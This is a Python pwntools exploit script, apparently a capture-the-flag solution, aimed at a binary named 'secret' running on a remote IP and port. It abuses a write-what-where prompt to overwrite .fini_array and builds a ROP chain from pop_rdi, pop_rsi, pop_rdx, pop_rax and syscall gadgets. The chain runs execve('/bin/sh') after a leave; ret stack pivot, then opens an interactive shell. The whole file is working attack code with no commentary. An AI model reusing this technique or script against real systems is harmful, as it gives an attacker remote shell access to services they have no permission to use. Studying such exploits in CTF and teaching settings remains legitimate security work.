from pwn import *

elf = ELF("secret")

#p = elf.process()
p = remote("103.245.249.76", 49156)
raw_input("DEBUG")
fini_array = 0x4db030
pop_rdi = 0x00000000004018ea
pop_rsi = 0x000000000040f3ae
pop_rdx = 0x00000000004017ef
pop_rax = 0x0000000000451d07
bin_sh = fini_array + 11*8
syscall = 0x000000000041f344
leave_ret = 0x0000000000401e57

def write(addr, data):
	p.sendlineafter("Where?\n", p64(addr))
	p.sendlineafter("What?\n",data)


p.sendline(b"6.89299e-42")
p.sendline(b"1.86425804967e-38")

write(fini_array,p64(0x403021)+p64(0x401f64))

p.sendline(b"6.89299e-42")
p.sendline(b"1.86425804967e-38")

write(fini_array+2*8,p64(pop_rdi)+p64(bin_sh))

p.sendline(b"6.89299e-42")
p.sendline(b"1.86425804967e-38")

write(fini_array+4*8,p64(pop_rsi)+p64(0))

p.sendline(b"6.89299e-42")
p.sendline(b"1.86425804967e-38")

write(fini_array+6*8,p64(pop_rdx)+p64(0))

p.sendline(b"6.89299e-42")
p.sendline(b"1.86425804967e-38")

write(fini_array+8*8,p64(pop_rax)+p64(0x3b))

p.sendline(b"6.89299e-42")
p.sendline(b"1.86425804967e-38")

write(fini_array+10*8,p64(syscall)+b"/bin/sh\x00")

p.sendline(b"6.89299e-42")
p.sendline(b"1.86425804967e-38")

write(fini_array,p64(leave_ret)+p64(leave_ret+1)+p64(pop_rdi)+p64(bin_sh)+p64(pop_rsi))


p.interactive()